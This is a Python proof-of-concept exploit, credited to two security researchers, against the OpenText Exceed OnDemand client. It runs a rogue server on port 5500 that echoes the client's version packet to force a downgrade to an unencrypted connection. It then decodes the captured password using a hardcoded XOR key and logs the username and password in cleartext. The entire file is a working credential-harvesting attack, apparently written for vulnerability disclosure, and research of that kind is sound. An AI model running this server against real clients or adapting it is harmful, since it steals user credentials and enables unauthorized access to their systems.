#!/usr/bin/env python
"""
OpenText Exceed OnDemand protocol downgrade PoC

This script will force a protocol downgrade for Exceed OnDemand client
to send credentials in unencrypted connections.

@author Slawomir Jasek <Slawomir dot Jasek at securing dot pl>
@author Krzysztof Kotowicz <kkotowicz at securing dot pl>

"""
import binascii
from itertools import cycle, izip
import SocketServer
import logging

class DumpExceedCredentialsRequestHandler(SocketServer.BaseRequestHandler):

    KEY = 'Hummingbird Communications Limited'

    def decode_password(self,passw):
        passw = binascii.unhexlify(passw)[::-1] # pass is hex-ascii encoded and reversed
        
        key = self.KEY # and xor-ed with this

        ciphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(passw, cycle(key)))
        return ciphered

    def process_auth_packet(self,data):
        USER_OFFSET = 23

        user_len = ord(data[USER_OFFSET])
        user = data[USER_OFFSET+1:USER_OFFSET+1+user_len]
        
        pass_offset = USER_OFFSET+1+user_len

        pass_len = ord(data[pass_offset])

        pass_encoded = data[pass_offset+1:pass_offset+1+pass_len]
        passw = self.decode_password(pass_encoded)
        return (user, passw)

    def handle(self):
        logging.info("Connection from: %s %d", self.client_address[0], self.client_address[1])

        data = self.request.recv(4)
        self.request.sendall(data)  # SEND BACK the same data as client saved
                                    # by sheer luck this is enough to trigger protocol downgrade

        logging.debug("version packet: %s", repr(data))

        # auth packet will be the first packet sent
        data = self.request.recv(3)
        length = ord(data[2])
        logging.debug("auth packet len: %d",length)
        logging.debug("received data: %s",repr(data))
        authdata = self.request.recv(length-3)
        logging.debug("auth packet: %s",repr(authdata))
        (user, passw) = self.process_auth_packet(authdata)
        
        logging.info("User: %s", user)
        logging.info("Password: %s", passw)
        self.request.close()

class TCPReuseAddrServer(SocketServer.TCPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    
    logging.basicConfig(level=logging.INFO,format='%(message)s')

    HOST, PORT = "0.0.0.0", 5500
    logging.info("Starting server at %s:%d" % (HOST,PORT))
    server = TCPReuseAddrServer((HOST, PORT), DumpExceedCredentialsRequestHandler)
    server.serve_forever()

